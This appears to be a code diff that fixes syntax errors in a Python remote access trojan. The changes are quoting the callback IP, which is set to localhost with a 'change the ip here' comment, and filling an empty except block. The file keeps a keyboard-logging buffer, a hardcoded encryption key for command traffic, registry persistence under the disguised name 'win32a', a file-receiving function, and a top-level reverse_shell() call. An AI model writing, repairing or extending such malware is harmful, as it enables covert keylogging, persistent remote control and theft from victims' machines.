@@ -27,7 +27,7 @@ import subprocess
 import threading
 import keyboard
 
-ip = 127.0.0.1 #Change the ip here
+ip = "127.0.0.1" #Change the ip here
 
 tkey = b'V\xff&2\xf7[\xb4O\x98\rYx\xb5\x88#M\xc2\xc7\x8b,\xc07Y.)\xfc\xf5\xc1\xd8p\xcf\xd4' #Key for crypt communication
 typed_strings = ""
@@ -76,6 +76,7 @@ def add_to_registry(executable_path):
         winreg.SetValueEx(key, "win32a", 0, winreg.REG_SZ, executable_path)
         winreg.CloseKey(key)
     except Exception as e:
+        pass
 
 
 
@@ -239,6 +240,5 @@ def receive_file(filename):
 
 
 reverse_shell()
-
 
 
